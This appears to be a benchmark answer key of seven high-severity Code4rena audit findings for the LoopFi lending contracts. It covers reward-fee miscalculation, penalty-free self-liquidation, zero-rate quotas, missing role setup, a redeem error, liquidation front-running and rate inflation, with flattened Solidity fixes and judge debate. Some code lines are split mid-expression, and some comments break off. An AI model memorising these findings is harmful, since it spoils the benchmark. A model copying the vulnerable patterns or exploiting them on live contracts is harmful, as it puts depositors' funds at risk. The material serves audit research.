# Benchmark Ground Truth: LoopFi

## Accepted H/M Findings

# Accepted H/M Findings: LoopFi

# [H-01] AuraVault::claim reward calculation does not deduct fees from reward amount, causing DoS or extra rewards lost

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** H-01
- **Severity:** High
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

AuraVault::claim reward calculation does not deduct fees from reward amount, causing DoS or extra rewards lost Submitted by crypticdefense, also found by Agontuk and mrMorningstar AuraVault::claim allows users to claim rewards corresponding to the amount of WETH they are depositing in the same call.

Prior to sending rewards to msg.sender, a percentage of the rewards is sent to the vault locker rewards. However, the percentage of the rewards sent to the vault locker rewards is not deducted from the amount that is sent to the caller. The entire reward amount is sent to msg.sender.

This is problematic, as it creates two possible scenarios:

Contract attempts to send more reward tokens than it holds, causing DoS.

Contract successfully sends extra reward tokens, essentially stealing rewards from others.

Therefore, the impact ranges from stolen funds to Denial of Service.

## Recommended Mitigation Steps

Ensure the amount sent to the locker is deducted from the amount sent to the caller:

/** * @notice Allows anyone to claim accumulated rewards by depositing WETH instead * @param amounts An array of reward amounts to be claimed ordered as [rewardToken, secondaryRewardToken] * @param maxAmountIn The max amount of WETH to be sent to the Vault */ function claim(uint256[] memory amounts, uint256 maxAmountIn) external returns (uint256 amountIn) { // Claim rewards from Aura reward pool IPool(rewardPool).getReward(); // Compute assets amount to be sent to the Vault VaultConfig memory _config = vaultConfig; amountIn = _previewReward(amounts[0], amounts[1], _config); // Transfer assets to Vault require(amountIn <= maxAmountIn, "!Slippage"); IERC20(asset()).safeTransferFrom(msg.sender, address(this), amountIn);

// Compound assets into "asset" balance IERC20(asset()).safeApprove(rewardPool, amountIn); IPool(rewardPool).deposit(amountIn, address(this)); // Distribute BAL rewards + uint256 fee = (amounts[0] * _config.lockerIncentive) / INCENTIVE_BASIS; + uint256 amount = amounts[0] - fee; - IERC20(BAL).safeTransfer(_config.lockerRewards, (amounts[0] * _config.lockerIncentive) / INCENTIVE_BASIS); - IERC20(BAL).safeTransfer(msg.sender, amounts[0]); + IERC20(BAL).safeTransfer(_config.lockerRewards, fee); + IERC20(BAL).safeTransfer(msg.sender, amount); // Distribute AURA rewards if (block.timestamp <= INFLATION_PROTECTION_TIME) { + fee = (amounts[1] * _config.lockerIncentive) / INCENTIVE_BASIS; + amount = amounts[1] - fee;

- IERC20(AURA).safeTransfer(_config.lockerRewards, (amounts[1] * _config.lockerIncentive) / INCENTIVE_BASIS); - IERC20(AURA).safeTransfer(msg.sender, amounts[1]); + IERC20(BAL).safeTransfer(_config.lockerRewards, fee); + IERC20(BAL).safeTransfer(msg.sender, amount); } else { // after INFLATION_PROTECTION_TIME IERC20(AURA).safeTransfer(_config.lockerRewards, IERC20(AURA).balanceOf(address(this))); } emit Claimed(msg.sender, amounts[0], amounts[1], amountIn); }

## Assessed type

Error amarcu (LoopFi) acknowledged and commented via duplicate issue #206:

Acknowledged but we will remove and not use the AuraVault.

# [H-02] Liquidation doesn’t account for penalty when calculating collateral to give, allowing users to profit by borrowing and self-liquidating

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** H-02
- **Severity:** High
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

Submitted by crypticdefense, also found by 0xhacksmithh, mrMorningstar, Bigsam, Chinmay, and pkqs90 CDPVault allows users to borrow underlying from PoolV3 by depositing collateral into the vault, such that the (collateral value of their position / liquidationRatio) >= their current total debt.

Users must repay their debt fully via CDPVault::repay, and the amount must cover their entire current total debt, which also includes various interest factors. If the value of their collateral divided by liquidationRatio is less than the debt of their position, then their position is considered unsafe and anyone can liquidate the position by buying the collateral at a discount. The amount spent by the caller is used to cover for the debt.

To ensure that users cannot profit from self liquidations, the liquidatePosition function incorporates a penalty mechanism, that is intended to deduct fees from the payment amount, which subsequently goes to the protocol as profit.

The problem is that when the liquidatePosition function calculates the collateral to give to the caller, it utilizes the the repay amount without the penalty, essentially functioning as if there is no penalty mechanism at all. The caller can specify any repay amount, and the collateral they receive will correspond directly to repay amount / discount, with no penalty.

This allows malicious users to profit by deposit collateral -> borrow WETH -> have their position become unsafe -> buy collateral with WETH at a discount. Malicious users can profit and steal funds from lenders and the protocol.

The natspec for the CDPVault::liquidatePosition states that “From that repay amount a penalty ( liquidationPenalty ) is subtracted to mitigate against profitable self liquidations.” However, we will see in the PoC how this has no impact against profitable self liquidations

## Recommended Mitigation Steps

Apply the penalty to repayAmount when calculating the amount of collateral to give to the caller. In addition, ensure that the protocol applies a high enough penalty such that self-liquidators cannot profit from this attack.

function liquidatePosition(address owner, uint256 repayAmount) external whenNotPaused { // validate params if (owner == address(0) || repayAmount == 0) revert CDPVault__liquidatePosition_invalidParameters(); // load configs VaultConfig memory config = vaultConfig; LiquidationConfig memory liqConfig_ = liquidationConfig; // load liquidated position Position memory position = positions[owner]; DebtData memory debtData = _calcDebt(position); // load price and calculate discounted price uint256 spotPrice_ = spotPrice(); uint256 discountedPrice = wmul(spotPrice_, liqConfig_.liquidationDiscount); if (spotPrice_ == 0) revert CDPVault__liquidatePosition_invalidSpotPrice(); // Ensure that there's no bad debt

if (calcTotalDebt(debtData) > wmul(position.collateral, spotPrice_)) revert CDPVault__BadDebt(); // compute collateral to take, debt to repay and penalty to pay - uint256 takeCollateral = wdiv(repayAmount, discountedPrice); uint256 deltaDebt = wmul(repayAmount, liqConfig_.liquidationPenalty); uint256 penalty = wmul(repayAmount, WAD - liqConfig_.liquidationPenalty); + uint256 takeCollateral = wdiv(repayAmount - penalty, discountedPrice); if (takeCollateral > position.collateral) revert CDPVault__tooHighRepayAmount(); // verify that the position is indeed unsafe if (_isCollateralized(calcTotalDebt(debtData), wmul(position.collateral, spotPrice_), config.liquidationRatio)) revert CDPVault__liquidatePosition_notUnsafe();

// transfer the repay amount from the liquidator to the vault poolUnderlying.safeTransferFrom(msg.sender, address(pool), repayAmount - penalty); uint256 newDebt; uint256 profit; uint256 maxRepayment = calcTotalDebt(debtData); uint256 newCumulativeIndex; if (deltaDebt == maxRepayment) { newDebt = 0; newCumulativeIndex = debtData.cumulativeIndexNow; profit = debtData.accruedInterest; position.cumulativeQuotaInterest = 0; } else { (newDebt, newCumulativeIndex, profit, position.cumulativeQuotaInterest) = calcDecrease( deltaDebt, // delta debt debtData.debt, debtData.cumulativeIndexNow, // current cumulative base interest index in Ray debtData.cumulativeIndexLastUpdate, debtData.cumulativeQuotaInterest

); } position.cumulativeQuotaIndexLU = debtData.cumulativeQuotaIndexNow; // update liquidated position position = _modifyPosition(owner, position, newDebt, newCumulativeIndex, -toInt256(takeCollateral), totalDebt); pool.repayCreditAccount(debtData.debt - newDebt, profit, 0); // U:[CM-11] // transfer the collateral amount from the vault to the liquidator token.safeTransfer(msg.sender, takeCollateral); // Mint the penalty from the vault to the treasury poolUnderlying.safeTransferFrom(msg.sender, address(pool), penalty); IPoolV3Loop(address(pool)).mintProfit(penalty); if (debtData.debt - newDebt != 0) { IPoolV3(pool).updateQuotaRevenue(_calcQuotaRevenueChange(-int(debtData.debt - newDebt))); // U:[PQK-15]

}

## Assessed type

Error 0xtj24 (LoopFi) disputed via duplicate issue #58:

The penalty is taken from the liquidator here.

crypticdefense (warden) commented:

@Koolex - This finding is how liquidators must pay repayAmount to the protocol with a penalty to prevent profitable self-liquidations.

repayAmount - penalty is used to cover the debt payment, and penalty is given to the protocol for profit. Since repayAmount-penalty is used to cover the debt, the caller should only get repayAmount-penalty worth of collateral. However, the caller receives the full repayAmount value of collateral including the penalty, as if the penalty added towards the debt. This defeats the purpose of the penalty and allows a critical vulnerability where an attacker can borrow and self liquidate at a discount, thus stealing funds from lenders/protocol, as described in the

# [H-03] Zero rates on new quoted tokens allow an attacker to take an interest free quota

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** H-03
- **Severity:** High
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

Submitted by Bauchibred Take a look here:

function addQuotaToken ( address token ) external override gaugeOnly { if ( quotaTokensSet.

contains ( token )) { revert TokenAlreadyAddedException (); } quotaTokensSet.

add ( token ); //@audit rates here are `0` by default.

totalQuotaParams [ token ].

cumulativeIndexLU = 1; emit AddQuotaToken ( token ); } This function is used to add a new token, when the token is added the rates are set to 0 by default up until a general epoch update before the real rate gets set for the token here.

function _checkAndUpdateEpoch () internal { uint16 epochNow = IGearStakingV3 ( voter ).

getCurrentEpoch (); // U:[GA-14] if ( epochNow > epochLastUpdate ) { epochLastUpdate = epochNow; // U:[GA-14] if (!

epochFrozen ) { // The quota keeper should call back to retrieve quota rates for needed tokens _poolQuotaKeeper ().

updateRates (); //@audit } emit UpdateEpoch ( epochNow ); // U:[GA-14] } Which calls this:

function updateRates () external override gaugeOnly // U:[PQK-3] { address [] memory tokens = quotaTokensSet.

values (); uint16 [] memory rates = IGaugeV3 ( gauge ).

getRates ( tokens ); // U:[PQK-7] uint256 quotaRevenue; // U:[PQK-7] uint256 timestampLU = lastQuotaRateUpdate; uint256 len = tokens.

length; for ( uint256 i; i < len; ) { address token = tokens [ i ]; uint16 rate = rates [ i ]; TokenQuotaParams storage tokenQuotaParams = totalQuotaParams [ token ]; // U:[PQK-7] ( uint16 prevRate, uint192 tqCumulativeIndexLU, ) = _getTokenQuotaParamsOrRevert ( tokenQuotaParams ); tokenQuotaParams.

cumulativeIndexLU = QuotasLogic.

cumulativeIndexSince ( tqCumulativeIndexLU, prevRate, timestampLU ); // U:[PQK-7] tokenQuotaParams.

rate = rate; // U:[PQK-7] quotaRevenue += ( IPoolV3 ( pool ).

creditManagerBorrowed ( creditManagers [ token ]) * rate ) / PERCENTAGE_FACTOR; // U:[PQK-7] emit UpdateTokenQuotaRate ( token, rate ); // U:[PQK-7] unchecked { ++ i; } IPoolV3 ( pool ).

setQuotaRevenue ( quotaRevenue ); // U:[PQK-7] lastQuotaRateUpdate = uint40 ( block.

timestamp ); // U:[PQK-7] } However, the problem is the fact that once this new token is added, and the rate is 0, an attacker can request a huge quota even up to the configured limit without having to pay any interest to the protocol all through the period where rate = 0.

## Impact

A malicious user can request a very high quota and not pay any interest all through the period when the rate is defaulted to 0.

## Recommended Mitigation Steps

Consider atomically updating the rates in the instance where a new quoted token is added.

## Assessed type

Context 0xtj24 (LoopFi) confirmed Koolex (judge) decreased severity to Medium and commented:

an attacker can request a huge quota even up to the configured limit without having to pay any interest to the protocol.

Requesting from the Warden to elaborate on this, only in PJQA please.

Bauchibred (warden) commented:

@Koolex, what that snippet means is the malicious user can take a completely risk free position while exposing the system since the rate is defaulted to 0; i.e., they can just request a very high quota, which in this case would be the configured maximum for said asset thats’s to be used to limit protocol’s exposure. So in this case they do not pay any interest all throughout this period when these rates are 0, which is why I submitted this as High.

To go into a bit more details on the whole context of the quota logic:

In the current implementation, quotas are used to limit the system’s exposure to some assets, so having zero rates is a direct loss on the protocol since no interest accrues over time with these rates and as such 0 payments get made for the requested quota; allowing the malicious users access to risk-free leveraging on the maximum amount of quota they can get.

Koolex (judge) increased severity to High and commented:

@Bauchibred - can you please provide a PoC on how a user can request a huge quota on zero rate? Not necessarily with code. but a breakdown of the call flow. The above proof lacking this.

Bauchibred (warden) commented:

@Koolex, requesting a huge quota is by just taking up a borrow position against the collateral and whenever calculating the debt from the borrowed position or the revenue change, the methods shown in the report above and dropdown below from PoolQuotaKeeper are used.

Call flow breakdown with code snippets A user can request a borrow credit against the collateral token here we’d have the deltaDebt to be non-zero which is what I mean by a huge quota. Now for each position there are two fees to be charged, one based on pool utilisation and another based on the quota fees from PoolQuotaKeeperV3 and since the quota interest has been defaulted to zero before the next epoch as hinted in the report whenever paying back the protocol loses out on this interest, (i.e., the quota interest):

- https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L256-L266
function borrow ( address borrower, address position, uint256 amount ) external { int256 deltaDebt = toInt256 ( amount ); modifyCollateralAndDebt ({ owner:

position, collateralizer:

position, creditor:

borrower, deltaCollateral:

0, deltaDebt:

deltaDebt }); } That’s to say when the user decides to repay, or their position is being interacted with the amount of debt is gotten by _calcDebt, but no quota interest is being calculated for them cause while calculating the debt for the position we have 0 interest rate being returned for cumulativeQuotaInterest. As such, it’s not being considered for the overall accrued interest:

- https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L467-L481
function _calcDebt ( Position memory position ) internal view returns ( DebtData memory cdd ) { uint256 index = pool.

baseInterestIndex (); cdd.

debt = position.

debt; cdd.

cumulativeIndexNow = index; cdd.

cumulativeIndexLastUpdate = position.

cumulativeIndexLastUpdate; cdd.

cumulativeQuotaIndexLU = position.

cumulativeQuotaIndexLU; // Get cumulative quota interest ( cdd.

cumulativeQuotaInterest, cdd.

cumulativeQuotaIndexNow ) = _getQuotedTokensData ( cdd ); cdd.

cumulativeQuotaInterest += position.

cumulativeQuotaInterest; cdd.

accruedInterest = CreditLogic.

calcAccruedInterest ( cdd.

debt, cdd.

cumulativeIndexLastUpdate, index ); cdd.

accruedInterest += cdd.

cumulativeQuotaInterest; } Note that the cumulativeQuotaInterest that’s been used to define the overall accrued interest is gotten directly from:

- https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L484-L495
function _getQuotedTokensData ( DebtData memory cdd ) internal view returns ( uint128 outstandingQuotaInterest, uint192 cumulativeQuotaIndexNow ) { cumulativeQuotaIndexNow = IPoolQuotaKeeperV3 ( poolQuotaKeeper ()).

cumulativeIndex ( address ( token )); uint128 outstandingInterestDelta = QuotasLogic.

calcAccruedQuotaInterest ( uint96 ( cdd.

debt ), cumulativeQuotaIndexNow, cdd.

cumulativeQuotaIndexLU ); outstandingQuotaInterest = outstandingInterestDelta; // U:[CM-24] } Which queries the Quota keeper to get the current index, that’s defined by the rate:

- https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/quotas/PoolQuotaKeeperV3.sol#L87-L93
function cumulativeIndex ( address token ) public view override returns ( uint192 ) { TokenQuotaParams storage tokenQuotaParams = totalQuotaParams [ token ]; ( uint16 rate, uint192 tqCumulativeIndexLU, ) = _getTokenQuotaParamsOrRevert ( tokenQuotaParams ); return QuotasLogic.

cumulativeIndexSince ( tqCumulativeIndexLU, rate, lastQuotaRateUpdate ); }

- https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/quotas/PoolQuotaKeeperV3.sol#L259-L276
function _getTokenQuotaParamsOrRevert ( TokenQuotaParams storage tokenQuotaParams ) internal view returns ( uint16 rate, uint192 cumulativeIndexLU, uint16 quotaIncreaseFee ) { // rate = tokenQuotaParams.rate; // cumulativeIndexLU = tokenQuotaParams.cumulativeIndexLU; // quotaIncreaseFee = tokenQuotaParams.quotaIncreaseFee; assembly { let data:= sload ( tokenQuotaParams.

slot ) rate:= and ( data, 0xFFFF ) //@audit rate here cumulativeIndexLU:= and ( shr ( 16, data ), 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF ) quotaIncreaseFee:= shr ( 208, data ) } if ( cumulativeIndexLU == 0 ) { revert TokenIsNotQuotedException (); // U:[PQK-14] } Also in the same light revenue change for quota would always be 0 during modification of collateral/debt or even liquidation that’s queried in the vault by the _calcQuotaRevenueChange() helper function:

- https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L462-L466
function _calcQuotaRevenueChange ( int256 deltaDebt ) internal view returns ( int256 quotaRevenueChange ) { uint16 rate = IPoolQuotaKeeperV3 ( poolQuotaKeeper ()).

getQuotaRate ( address ( token )); return QuotasLogic.

calcQuotaRevenueChange ( rate, deltaDebt ); }

- https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/quotas/QuotasLogic.sol#L38-L41
/// @dev Computes the pool quota revenue change given the current rate and the quota change function calcQuotaRevenueChange ( uint16 rate, int256 change ) internal pure returns ( int256 ) { return change * int256 ( uint256 ( rate )) / int16 ( PERCENTAGE_FACTOR ); } Edit: Took consideration of @0xAlix2’s comment below and explicitly attached the fact that the interest which Loopfi is losing out on is their “quota interest” and not the whole debt’s interest as they assume. To note, why we are talking about debt in this discussion is cause I needed to showcase where the huge quota is requested since asked by the judge. Do check the diffs for the edit. In my opinion, this fact can also be seen clearly even from the title of the report that the user is getting an “interest free quota” and not an interest free debt.

NB: This same issue was reported and fixed in the original Gearbox protocol, see 7.3 which this is a fork of. Albeit in that instance it was assessed as a Medium, I submitted as high cause per C4 standards and as hinted here already, it doesn’t need any hypothetical path to be actualised.

0xAlix2 (warden) commented:

There’s some confusion here, having 0 cdd.cumulativeQuotaInterest doesn’t mean no interest. Let me explain, Loopfi has 2 separate interest rates, there’s the quota interest and the default credit interest, as seen the credit interest calculation has nothing to do with the Quota’s logic, you can confirm this from Loopfi’s docs.

I also had this fuzzing test that confirms this, that you can add in src/test/unit/CDPVault.t.sol:

function test_someFuzzzz () public { CDPVault vault = createCDPVault ( token, 150 ether, 0, 1.25 ether, 1.0 ether, 0 ); createGaugeAndSetGauge ( address ( vault )); address position = address ( new PositionOwner ( vault )); uint256 depositAmount = 100 ether; uint256 borrowAmount = 80 ether; token.

mint ( address ( this ), depositAmount ); token.

approve ( address ( vault ), depositAmount ); underlyingToken.

mint ( address ( this ), depositAmount ); underlyingToken.

approve ( address ( vault ), depositAmount ); uint256 initialInterestRate = vault.

pool ().

baseInterestRate (); vault.

deposit ( position, depositAmount ); vault.

borrow ( address ( this ), position, borrowAmount ); vm.

warp ( block.

timestamp + 30 days ); console.

log ( "repay" ); vault.

repay ( address ( this ), position, vault.

virtualDebt ( position )); } function _calcDebt(Position memory position) internal view returns (DebtData memory cdd) { uint256 index = pool.baseInterestIndex(); cdd.debt = position.debt; cdd.cumulativeIndexNow = index; cdd.cumulativeIndexLastUpdate = position.cumulativeIndexLastUpdate; cdd.cumulativeQuotaIndexLU = position.cumulativeQuotaIndexLU; // Get cumulative quota interest (cdd.cumulativeQuotaInterest, cdd.cumulativeQuotaIndexNow) = _getQuotedTokensData(cdd); cdd.cumulativeQuotaInterest += position.cumulativeQuotaInterest; + console.log("cdd.cumulativeQuotaInterest", cdd.cumulativeQuotaInterest); cdd.accruedInterest = CreditLogic.calcAccruedInterest(cdd.debt, cdd.cumulativeIndexLastUpdate, index);

+ console.log("cdd.accruedInterest", cdd.accruedInterest); cdd.accruedInterest += cdd.cumulativeQuotaInterest; } Logs:

cdd.cumulativeQuotaInterest 0 cdd.accruedInterest 0 cdd.cumulativeQuotaInterest 0 cdd.accruedInterest 0 cdd.cumulativeQuotaInterest 0 cdd.accruedInterest 0 repay cdd.cumulativeQuotaInterest 6575342465753424 cdd.accruedInterest 657658017727639000 cdd.cumulativeQuotaInterest 6575342465753424 cdd.accruedInterest 657658017727639000 As seen the quota interest did accumulate.

Assuming the test is wrong (which I don’t think so), and the quota interest is 0, we can manually manipulate the quota index (so that it matches the initially set index here ) so that the resulting quota interest is 0:

function _getQuotedTokensData( DebtData memory cdd ) internal view returns (uint128 outstandingQuotaInterest, uint192 cumulativeQuotaIndexNow) { - cumulativeQuotaIndexNow = IPoolQuotaKeeperV3(poolQuotaKeeper()).cumulativeIndex(address(token)); + cumulativeQuotaIndexNow = 1; uint128 outstandingInterestDelta = QuotasLogic.calcAccruedQuotaInterest( uint96(cdd.debt), cumulativeQuotaIndexNow, cdd.cumulativeQuotaIndexLU ); outstandingQuotaInterest = outstandingInterestDelta; // U:[CM-24] } Logs:

cdd.cumulativeQuotaInterest 0 cdd.accruedInterest 0 cdd.cumulativeQuotaInterest 0 cdd.accruedInterest 0 cdd.cumulativeQuotaInterest 0 cdd.accruedInterest 0 repay cdd.cumulativeQuotaInterest 0 cdd.accruedInterest 657658017727639000 cdd.cumulativeQuotaInterest 0 cdd.accruedInterest 657658017727639000 We can see that the Quota interest is indeed 0, but the user is casually paying the other “credit” interest.

As a result, there’s always some interest being paid to the protocol.

Edit: My response mainly refuted the following, showing that interest will always be paid regardless of the Quota.

an attacker can request a huge quota even up to the configured limit without having to pay any interest to the protocol Assuming that the Quotas interest will always be 0 (I still doubt it, as the above test shows this, unless I’m missing something), for this to be high, assets need to be “stolen/lost/compromised”, how is this happening here?

Koolex (judge) commented:

@Bauchibred - I’m already aware that the issue was already reported elsewhere; in fact, if you search the in the codebase (in the lib) you would find the fixed version. Somehow, the devs overlooked it.

quotaChange = ( rate == 0 ) ?

int96 ( 0 ):

QuotasLogic.

calcActualQuotaChange ( totalQuoted, limit, quotaChange ); // U:[PQK-15] To summarize the impact, quota interest won’t be paid during the period where rate = 0, max time of this is one epoch. In normal cases, I would consider this as a Medium. However, I have re-assessed it above as High for the following reasons:

It can happen on each new token added.

Can be done at scale (i.e., many users) or one user with a huge amount, as a result loss of interest for LPs who voted for it.

It undermines the intended functionality from voting (CA vs LP) on quota rate, if there is any.

# [H-04] AuraVault inherits AccessControl BUT does not call the _setupRole() function in it’s constructor to set the initial roles. This leads to a complete DOS of the important claim function rendering the contract unable to claim rewards

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** H-04
- **Severity:** High
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

AuraVault inherits AccessControl BUT does not call the _setupRole() function in it’s constructor to set the initial roles. This leads to a complete DOS of the important claim function rendering the contract unable to claim rewards Submitted by Spearmint, also found by karsar, 0xBugSlayer, lian886, Kaysoft, zhaojie, 0xpiken, inh3l, EPSec, and pkqs90 The AuraVault contract inherits OpenZeppelin’s AccessControl contract to implement role-based access control. The issue is that the AuraVault contract does not call the _setupRole() function in it’s constructor to set the DEFAULT_ADMIN_ROLE, VAULT_ADMIN_ROLE or VAULT_CONFIG_ROLE roles.

Since this is not done in the constructor it is impossible to call grantRole() since it has the onlyRole(getRoleAdmin(role)) modifier. It is important to note that no roles have been set; therefore, there is no address that can call this function to set roles. Therefore, it is impossible to set the VAULT_ADMIN_ROLE and VAULT_CONFIG_ROLE roles.

The minor impact is that the setParameter() function can never be called to change the feed or auraPriceOracle because it has the onlyRole(VAULT_CONFIG_ROLE) modifier. The critical impact is because setVaultConfig() function can never be called to initialize the vaultConfig.

The uninitialized vaultConfig struct will default all the variables to 0:

struct VaultConfig { /// @notice The incentive sent to claimer (in bps) uint32 claimerIncentive; /// @notice The incentive sent to lockers (in bps) uint32 lockerIncentive; /// @notice The locker rewards distributor address lockerRewards; } /// @notice CDPVault configuration VaultConfig public vaultConfig; The issue arises specifically from the lockerRewards variable being the 0 address. When a user calls claim() to claim accumulated rewards by depositing WETH instead, the following line will cause the call to always revert since it attempts to send 0 BAL to the 0 address.

function claim ( uint256 [] memory amounts, uint256 maxAmountIn ) external returns ( uint256 amountIn ) { // Claim rewards from Aura reward pool IPool ( rewardPool ).

getReward ();...

// Distribute BAL rewards IERC20 ( BAL ).

safeTransfer ( _config.

lockerRewards, ( amounts [ 0 ] * _config.

lockerIncentive ) / INCENTIVE_BASIS );...

} The balancer token will revert if the recipient is the 0 address due to the following check in it’s _transfer function ( BAL token on etherscan ).

function _transfer ( address sender, address recipient, uint256 amount ) internal virtual { require ( sender != address ( 0 ), "ERC20: transfer from the zero address" ); require ( recipient != address ( 0 ), "ERC20: transfer to the zero address" ); _beforeTokenTransfer ( sender, recipient, amount ); _balances [ sender ] = _balances [ sender ].

sub ( amount, "ERC20: transfer amount exceeds balance" ); _balances [ recipient ] = _balances [ recipient ].

add ( amount ); emit Transfer ( sender, recipient, amount ); }

## Impact

The minor impact is that the setParameter() function can never be called to change the feed or auraPriceOracle because it has the onlyRole(VAULT_CONFIG_ROLE) modifier. The critical impact is because setVaultConfig() function can never be called to initialize the vaultConfig.

The uninitialized vaultConfig struct will default all the variables to 0, causing the claim function to revert permanently. Since the claim() function always reverts it will be impossible to claim the rewards; therefore, there is no incentive to be deposit in the pool.

## Recommended Mitigation Steps

Modify the AuraVault constructor as follows:

constructor( address rewardPool_, address asset_, address feed_, address auraPriceOracle_, uint32 maxClaimerIncentive_, uint32 maxLockerIncentive_, string memory tokenName_, string memory tokenSymbol_, + address vaultAdminRole, + address vaultConfigRole ) ERC4626(IERC20(asset_)) ERC20(tokenName_, tokenSymbol_) { rewardPool = rewardPool_; feed = feed_; auraPriceOracle = auraPriceOracle_; maxClaimerIncentive = maxClaimerIncentive_; maxLockerIncentive = maxLockerIncentive_; + _setupRole(VAULT_ADMIN_ROLE, vaultAdminRole); + _setupRole(VAULT_CONFIG_ROLE, vaultConfigRole); }

## Assessed type

Access Control amarcu (LoopFi) acknowledged and commented:

Acknowledged but we will remove and not use the AuraVault.

# [H-05] There is a calculation error in AuraVault::redeem()

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** H-05
- **Severity:** High
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

AuraVault::redeem() Submitted by lian886, also found by novamanbg The amount of funds that users can withdraw decreases, leading to a loss of funds for users.

## Recommended Mitigation Steps

function redeem( uint256 shares, address receiver, address owner ) public virtual override(IERC4626, ERC4626) returns (uint256) { require(shares <= maxRedeem(owner), "ERC4626: redeem more than max"); + uint256 assets = previewRedeem(shares); // Redeem assets from Aura reward pool and send to "receiver" - uint256 assets = IPool(rewardPool).redeem(shares, address(this), address(this)); + assets = IPool(rewardPool).redeem(assets, address(this), address(this)); _withdraw(_msgSender(), receiver, owner, assets, shares); return assets; }

## Assessed type

Error amarcu (LoopFi) acknowledged and commented:

Acknowledged but we will remove and not use the AuraVault.

# [H-06] Malicious borrower can evade full liquidation in CDPVault::liquidatePosition by repaying small amounts of debt

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** H-06
- **Severity:** High
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

CDPVault::liquidatePosition by repaying small amounts of debt Submitted by 0xbepresent, also found by Spearmint and Evo

- https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L509
- https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L713

## Impact

In the CDPVault::liquidatePosition function, a liquidator can repay the total debt of a position to liquidate it, this can be achieved by calling the CDPVault::virtualDebt function to obtain the total debt and then call CDPVault::liquidatePosition. However, a malicious borrower can front-run this liquidation transaction by repaying a small amount (e.g., 1 wei) of the debt. This action causes the debt to be slightly less than the amount the liquidator intends to repay. Consequently, the subtraction operation in CDPVault#L713 will underflow, leading to a revert in the transaction. This will allow borrowers to evade total debt liquidation.

## Recommended Mitigation Steps

Implement a validation to prevent repayment if the position remains liquidable after increasing the repayment amount.

## Assessed type

Under/Overflow 0xtj24 (LoopFi) acknowledged and commented:

All liquidators would have to take into account a possible repayment from other liquidators. He could split into 2 repayments for example.

The liquidatePosition already checks if an amount is too high for repayment. Also, in case of 1 wei, it is not economically feasible since it would just be better for the borrower to repay instead of spending gas for multiple txs to avoid liquidation, since it would have to constantly frontrunning it.

Koolex (judge) commented:

I see two issues here:

A malicious actor can DoS liquidators, not only one. Since liquidators race and eventually one will win. In this case, the malicious actor.

DoS could naturally happen if more than one liquidator race for liquidation and the sum of the amounts isn’t equal to the highest possible amount.

Please take into consideration, if the loan is too big, the costs of gas is relatively too small.

# [H-07] Malicious borrower cycle exploits to inflate interest rates

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** H-07
- **Severity:** High
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

Submitted by Evo

- https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L256
- https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L272

## Impact

The current implementation allows a malicious actor to artificially inflate interest rates for all borrowers in the system through rapid borrow-and-repay cycles. This exploit can lead to:

Increased costs for legitimate borrowers who may face higher interest rates than expected.

Potential forced liquidations of other borrowers if interest rates rise rapidly enough to push their positions into unsafe territory.

Unfair advantage for the attacker if they are also a lender in the system, as they could increase returns on their deposits.

This vulnerability undermines the fairness and stability of the lending platform, potentially leading to loss of funds for users.

## Recommended Mitigation Steps

Consider adding a fee for taking a loan (including same block loan) to disincentivize this behavior.

Add a minimum duration for loans, requiring borrowers to hold the loan for a set period before repaying.

0xtj24 (LoopFi) acknowledged and commented:

This is an expected behaviour since the base rate will depend on the utilization rate so if a user borrows rates will increase.

Koolex (judge) commented:

@0xtj24 - Per my understanding, the main issue is a risk free attack to inflate the rates since the attacker doesn’t pay any fee.

0xAlix2 (warden) commented:

@Koolex - I believe this is intended, if the user is borrowing debt, then repaying the debt; i.e., the protocol is making some profit, the interest rate should indeed increase. As the sponsor mentioned, it depends on the utilization rate. This can’t even be considered griefing as the attacker will lose money, as he’ll be continuously paying his debt + some interest.

Hence, I believe this is invalid.

pkqs90 (warden) commented:

Agree with @0xAlix2. The “attacker” needs to pay off debt himself, so this is not risk-free. Technically this isn’t an attack, more like continuously borrowing/repaying assets and paying the debt, which is do-able on any lending protocol.

Koolex (judge) commented:

